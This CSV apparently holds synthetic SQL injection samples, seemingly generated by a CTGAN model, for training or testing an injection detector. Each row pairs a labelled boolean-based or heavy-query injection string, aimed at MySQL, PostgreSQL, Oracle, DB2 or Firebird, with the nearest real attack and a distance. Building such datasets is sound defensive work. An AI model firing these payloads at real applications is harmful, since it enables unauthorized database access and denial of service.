id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,boolean,"1 where 6077  =  6077 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000116,4.699982766929916
CTGAN_000002,attack,boolean,"1' in boolean mode  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #",nearest_attack_euclidean,R000178,8.556137241761595
CTGAN_000003,attack,boolean,"1 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- dpph",nearest_attack_euclidean,R000053,4.840004080708819
CTGAN_000004,attack,boolean,select * from users where id  =  1 <@$_ or 1  =  1 -- 1,nearest_attack_euclidean,R000013,15.163010211320662
CTGAN_000005,attack,boolean,-7758%'   )    )     )   or 3038  =  3038,nearest_attack_euclidean,R000048,4.707379703671276
CTGAN_000006,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'pgyl'  =  'pgyl",nearest_attack_euclidean,R000112,6.045016406905393
CTGAN_000007,attack,boolean,"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000070,5.492159931847494
CTGAN_000008,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000223,6.033299346032191
CTGAN_000009,attack,boolean,"1%'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000071,6.428834303151839
CTGAN_000010,attack,boolean,"1   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   4686  =  4686",nearest_attack_euclidean,R000262,7.974387220164045
CTGAN_000011,attack,boolean,"1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  # jcdh",nearest_attack_euclidean,R000296,6.9213772809631635
CTGAN_000012,attack,boolean,"1'  )   as elnu where 5719  =  5719 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000281,7.03829412998956
CTGAN_000013,attack,boolean,"-3501'   )    )     )   or make_set  (  7122  =  6158,6158  )   and    (    (     (  'mlfl' like 'mlfl",nearest_attack_euclidean,R000063,3.8473194263312456
CTGAN_000014,attack,boolean,select * from users where id  =  1 <@$_ or 1  =  1 -- 1,nearest_attack_euclidean,R000013,11.211473819842361
CTGAN_000015,attack,boolean,"-5840'  )   or elt  (  1032  =  1032,3623  )  ",nearest_attack_euclidean,R000279,5.994831573695855
CTGAN_000016,attack,boolean,"1%'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000071,4.862101989290364
CTGAN_000017,attack,boolean,"1%'   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000250,6.146505656018339
CTGAN_000018,attack,boolean,1'+  (  select wgmn where 4368  =  4368 and 7859  =  6151  )  +',nearest_attack_euclidean,R000038,5.891096541796399
CTGAN_000019,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000173,4.910900299682743
CTGAN_000020,attack,boolean,"1'||  (  select 'osty' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000184,5.363343228677065
CTGAN_000021,attack,boolean,"1' in boolean mode  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  #",nearest_attack_euclidean,R000178,6.707345576609485
CTGAN_000022,attack,boolean,-7773' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,nearest_attack_euclidean,R000310,5.341678706497381
CTGAN_000023,attack,boolean,"1%'   )    )     )   and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000043,6.662091800815865
